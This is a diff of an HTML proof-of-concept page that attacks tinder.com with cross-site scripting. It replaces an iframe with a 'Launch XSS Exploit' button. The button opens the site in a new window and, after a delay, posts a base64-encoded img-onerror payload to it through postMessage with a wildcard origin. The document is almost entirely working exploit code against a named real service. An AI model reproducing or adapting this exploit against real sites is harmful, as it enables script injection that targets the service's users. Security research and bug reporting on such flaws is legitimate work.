@@ -1,24 +1,24 @@
 <!DOCTYPE html>
 <html>
-  <head>
-    <title>Tinder XSS PoC</title>
-  </head>
+  <head><title>PoC - Tinder XSS via window.open</title></head>
   <body>
-    <h2>✅ iframe loaded</h2>
-    <iframe id="target" src="https://tinder.com" width="800" height="600"></iframe>
+    <button onclick="exploit()">🚀 Launch XSS Exploit</button>
 
     <script>
-      const payload = {
-        content: `<img src=x onerror=alert(document.domain)>`
-      };
-      const encoded = btoa(JSON.stringify(payload));
+      function exploit() {
+        const win = window.open("https://tinder.com", "_blank");
 
-      const iframe = document.getElementById("target");
+        const payload = {
+          content: `<img src=x onerror=alert(document.domain)>`
+        };
+        const encoded = btoa(JSON.stringify(payload));
 
-      iframe.onload = () => {
-        console.log("🚀 Sending XSS payload...");
-        iframe.contentWindow.postMessage(encoded, "*");
-      };
+        // إرسال البايلود بعد فترة قصيرة لضمان تحميل الصفحة
+        setTimeout(() => {
+          console.log("🚀 Sending XSS payload...");
+          win.postMessage(encoded, "*");
+        }, 3000);
+      }
     </script>
   </body>
 </html>
